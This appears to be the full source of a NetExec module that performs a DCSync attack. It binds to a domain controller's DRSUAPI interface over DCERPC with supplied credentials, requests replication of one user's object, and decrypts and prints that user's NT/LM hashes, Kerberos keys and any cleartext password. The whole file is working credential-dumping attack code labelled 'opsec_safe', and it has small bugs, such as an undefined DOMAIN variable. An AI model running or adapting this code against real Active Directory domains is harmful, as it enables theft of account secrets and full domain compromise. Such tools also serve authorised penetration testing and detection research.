
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, DCERPC_v5
from impacket.dcerpc.v5 import epm, drsuapi, transport, samr
from impacket.examples.secretsdump import NTDSHashes
from impacket.dcerpc.v5.dtypes import NULL
from impacket.uuid import string_to_bin
from nxc.connection import connection as Connection
from nxc.context import Context
from impacket import ntlm

from typing import Tuple

import binascii
import struct

class NXCModule:
    """
    Use DRSUAPI over DCERPC to trigger a DCSync without using SMB.
    Module by @Aether, inspire by Impacket secretsdump.py
    """

    name = "dcsync"
    description = "DCSync over DCERPC without SMB interaction"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = False

    def __init__(self, context : Context = None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context : Context, module_options: dict):
        r"""
        JUST_DC_USER Extract only data for the user specified.
        """
        self.__justUser = module_options.get("JUST_DC_USER", None)

    def on_login(self, context : Context, connection: Connection):
        self.__username = connection.username
        self.__password = connection.password
        self.__domain = connection.domain
        self.__kdcHost = connection.kdcHost
        self.__host = self.__kdcHost if self.__kdcHost else connection.host
        self.__doKerberos = connection.kerberos
        self.__lmhash = ""
        self.__nthash = ""
        self.__hash = context.hash
        self.__aesKey = context.aesKey
        self.__stringbinding = ""

        self.__getNTLMHash()

        drsr = self.__getRPCTransport(context)
        drsr.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        if self.__doKerberos:
            drsr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        
        drsr.connect()
        drsr.bind(drsuapi.MSRPC_UUID_DRSUAPI)

        request, drs = self.__buildFirstRequest()
        resp = drsr.request(request)

        hDrs = self.__buildhDRS(drsr, resp, request, drs)

        # Now let's get the NtdsDsaObjectGuid UUID to use when querying NCChanges
        resp = drsuapi.hDRSDomainControllerInfo(drsr, hDrs, self.__domain, 2)

        if resp['pmsgOut']['V2']['cItems'] > 0:
            NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
        else:
            context.log.exception("Couldn't get DC info for domain %s" % DOMAIN)
            raise Exception('Fatal, aborting')
        
        resp = drsuapi.hDRSCrackNames(drsr, hDrs, 0, drsuapi.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN, drsuapi.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME, (self.__justUser,))

        if resp['pmsgOut']['V1']['pResult']['cItems'] != 1:
            raise Exception("User %s not found!" % self.__justUser)

        if resp['pmsgOut']['V1']['pResult']['rItems'][0]['status'] != 0:
            raise Exception("ERROR: %s" % 0x2114 + resp['pmsgOut']['V1']['pResult']['rItems'][0]['status'])

        userGuid = resp['pmsgOut']['V1']['pResult']['rItems'][0]['pName'][:-1]

        request = self.__buildNCChanges(userGuid, hDrs, NtdsDsaObjectGuid)
        resp = drsr.request(request)

        replyVersion = 'V%d' % resp['pdwOutVersion']
        hashes = NTDSDCSyncHashes.decrypt(drsr, resp, resp['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'])

        hashes = self.__justUser + ":" + hashes

        context.log.highlight(hashes)

        hashes = NTDSDCSyncHashes.decryptSupplementalInfo(drsr, resp, resp['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'])

        for h in hashes:
            context.log.highlight(h)

    def __getNTLMHash(self) -> None:
        if self.__hash and ":" in self.__hash[0]:
            hashList = self.__hash[0].split(":")
            self.__nthash = hashList[-1]
            self.__lmhash = hashList[0]
        elif self.__hash and ":" not in self.__hash[0]:
            self.__nthash = self.__hash[0]
            self.__lmhash = "00000000000000000000000000000000"

    def __getRPCTransport(self, context) -> DCERPC_v5:
        self.__stringbinding = epm.hept_map(self.__host, drsuapi.MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp')
        context.log.debug(f"StringBinding {self.__stringbinding}")

        rpctransport = transport.DCERPCTransportFactory(self.__stringbinding)
        rpctransport.setRemoteHost(self.__host)
        rpctransport.setRemoteName(self.__host)

        rpctransport.set_credentials(
            username=self.__username,
            password=self.__password,
            domain=self.__domain,
            lmhash=self.__lmhash,
            nthash=self.__nthash,
            aesKey=self.__aesKey
        )

        rpctransport.set_kerberos(self.__doKerberos, self.__host)

        return rpctransport.get_dce_rpc()

    def __buildFirstRequest(self) -> Tuple[drsuapi.DRSBind, drsuapi.DRS_EXTENSIONS_INT]:
        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID

        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs)
        drs['dwFlags'] = drsuapi.DRS_EXT_GETCHGREQ_V6 | drsuapi.DRS_EXT_GETCHGREPLY_V6 | \
                            drsuapi.DRS_EXT_GETCHGREQ_V8 | drsuapi.DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = drsuapi.NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = 0
        drs['ConfigObjGUID'] = drsuapi.NULLGUID
        drs['dwExtCaps'] = 0xffffffff

        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(drs.getData())

        return (request, drs, )
    
    def __buildhDRS(self, drsr: DCERPC_v5, resp, request: drsuapi.DRSBind, drs: drsuapi.DRS_EXTENSIONS_INT) -> None:
        # Let's dig into the answer to check the dwReplEpoch. This field should match the one we send as part of
        # DRSBind's DRS_EXTENSIONS_INT(). If not, it will fail later when trying to sync data.
        drsExtensionsInt = drsuapi.DRS_EXTENSIONS_INT()

        # If dwExtCaps is not included in the answer, let's just add it so we can unpack DRS_EXTENSIONS_INT right.
        ppextServer = b''.join(resp['ppextServer']['rgb']) + b'\x00' * (
        len(drsuapi.DRS_EXTENSIONS_INT()) - resp['ppextServer']['cb'])
        drsExtensionsInt.fromString(ppextServer)

        if drsExtensionsInt['dwReplEpoch'] != 0:
            # Different epoch, we have to call DRSBind again
            drs['dwReplEpoch'] = drsExtensionsInt['dwReplEpoch']
            request['pextClient']['cb'] = len(drs)
            request['pextClient']['rgb'] = list(drs.getData())
            resp = drsr.request(request)

        return resp['phDrs']
    
    def __buildNCChanges(self, userGuid, hDrs, NtdsDsaObjectGuid) -> None:
        dsName = drsuapi.DSNAME()
        dsName['SidLen'] = 0
        dsName['Guid'] = string_to_bin(userGuid[1:-1])
        dsName['Sid'] = ''
        dsName['NameLen'] = 0
        dsName['StringName'] = ('\x00')
        dsName['structLen'] = len(dsName.getData())

        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = hDrs
        request['dwInVersion'] = 8

        request['pmsgIn']['tag'] = 8
        request['pmsgIn']['V8']['uuidDsaObjDest'] = NtdsDsaObjectGuid
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = NtdsDsaObjectGuid

        request['pmsgIn']['V8']['pNC'] = dsName

        request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
        request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0

        request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL

        request['pmsgIn']['V8']['ulFlags'] =  drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        request['pmsgIn']['V8']['ulExtendedOp'] = drsuapi.EXOP_REPL_OBJ

        ppartialAttrSet = None

        if ppartialAttrSet is None:
            prefixTable = []
            ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
            ppartialAttrSet['dwVersion'] = 1
            ppartialAttrSet['cAttrs'] = len(NTDSHashes.ATTRTYP_TO_ATTID)
            for attId in list(NTDSHashes.ATTRTYP_TO_ATTID.values()):
                ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(prefixTable , attId))

        request['pmsgIn']['V8']['pPartialAttrSet'] = ppartialAttrSet
        request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(prefixTable)
        request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = prefixTable
        request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL

        return request

class NTDSDCSyncHashes:

    @staticmethod
    def decrypt(drsr, record, prefixTable=None) -> str:
        replyVersion = 'V%d' %record['pdwOutVersion']

        rid = struct.unpack('<L', record['pmsgOut'][replyVersion]['pObjects']['Entinf']['pName']['Sid'][-4:])[0]

        for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
            try:
                attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                LOOKUP_TABLE = NTDSHashes.ATTRTYP_TO_ATTID
            except Exception as e:
                # Fallbacking to fixed table and hope for the best
                attId = attr['attrTyp']
                LOOKUP_TABLE = NTDSHashes.NAME_TO_ATTRTYP

            if attId == LOOKUP_TABLE['dBCSPwd']:
                if attr['AttrVal']['valCount'] > 0:
                    encrypteddBCSPwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    encryptedLMHash = drsuapi.DecryptAttributeValue(drsr, encrypteddBCSPwd)
                    LMHash = drsuapi.removeDESLayer(encryptedLMHash, rid)
                else:
                    LMHash = ntlm.LMOWFv1('', '')
            elif attId == LOOKUP_TABLE['unicodePwd']:
                if attr['AttrVal']['valCount'] > 0:
                    encryptedUnicodePwd = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    encryptedNTHash = drsuapi.DecryptAttributeValue(drsr, encryptedUnicodePwd)
                    NTHash = drsuapi.removeDESLayer(encryptedNTHash, rid)
                else:
                    NTHash = ntlm.NTOWFv1('', '')

        return "%s:%s:%s:::" % (rid, LMHash.hex(), NTHash.hex())

    @staticmethod
    def decryptSupplementalInfo(drsr, record, prefixTable=None) -> list:
        # This is based on [MS-SAMR] 2.2.10 Supplemental Credentials Structures
        haveInfo = False

        returnData = list()

        domain = None
        userName = None
        replyVersion = 'V%d' % record['pdwOutVersion']
        for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
            try:
                attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                LOOKUP_TABLE = NTDSHashes.ATTRTYP_TO_ATTID
            except Exception as e:
                # Fallbacking to fixed table and hope for the best
                attId = attr['attrTyp']
                LOOKUP_TABLE = NTDSHashes.NAME_TO_ATTRTYP

            if attId == LOOKUP_TABLE['userPrincipalName']:
                if attr['AttrVal']['valCount'] > 0:
                    try:
                        domain = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le').split('@')[-1]
                    except:
                        domain = None
                else:
                    domain = None
            elif attId == LOOKUP_TABLE['sAMAccountName']:
                if attr['AttrVal']['valCount'] > 0:
                    try:
                        userName = b''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                    except:
                        userName = 'unknown'
                else:
                    userName = 'unknown'
            if attId == LOOKUP_TABLE['supplementalCredentials']:
                if attr['AttrVal']['valCount'] > 0:
                    blob = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                    plainText = drsuapi.DecryptAttributeValue(drsr, blob)
                    if len(plainText) > 24:
                        haveInfo = True

        if domain is not None:
            userName = '%s\\%s' % (domain, userName)

        if haveInfo is True:

            try:
                userProperties = samr.USER_PROPERTIES(plainText)
            except:
                # On some old w2k3 there might be user properties that don't
                # match [MS-SAMR] structure, discarding them
                return

            propertiesData = userProperties['UserProperties']
            for propertyCount in range(userProperties['PropertyCount']):
                userProperty = samr.USER_PROPERTY(propertiesData)
                propertiesData = propertiesData[len(userProperty):]
                # For now, we will only process Newer Kerberos Keys and CLEARTEXT
                if userProperty['PropertyName'].decode('utf-16le') == 'Primary:Kerberos-Newer-Keys':
                    propertyValueBuffer = binascii.unhexlify(userProperty['PropertyValue'])
                    kerbStoredCredentialNew = samr.KERB_STORED_CREDENTIAL_NEW(propertyValueBuffer)
                    data = kerbStoredCredentialNew['Buffer']
                    for credential in range(kerbStoredCredentialNew['CredentialCount']):
                        keyDataNew = samr.KERB_KEY_DATA_NEW(data)
                        data = data[len(keyDataNew):]
                        keyValue = propertyValueBuffer[keyDataNew['KeyOffset']:][:keyDataNew['KeyLength']]

                        if  keyDataNew['KeyType'] in NTDSHashes.KERBEROS_TYPE:
                            answer =  "%s:%s:%s" % (userName, NTDSHashes.KERBEROS_TYPE[keyDataNew['KeyType']], keyValue.hex())
                        else:
                            answer =  "%s:%s:%s" % (userName, hex(keyDataNew['KeyType']), keyValue.hex())

                        returnData.append(answer)
                elif userProperty['PropertyName'].decode('utf-16le') == 'Primary:CLEARTEXT':
                    # [MS-SAMR] 3.1.1.8.11.5 Primary:CLEARTEXT Property
                    # This credential type is the cleartext password. The value format is the UTF-16 encoded cleartext password.
                    try:
                        answer = "%s:CLEARTEXT:%s" % (userName, binascii.unhexlify(userProperty['PropertyValue']).decode('utf-16le'))
                    except UnicodeDecodeError:
                        # This could be because we're decoding a machine password. Printing it hex
                        answer = "%s:CLEARTEXT:0x%s" % (userName, userProperty['PropertyValue'].decode('utf-8'))

                    returnData.append(answer)

        return returnData
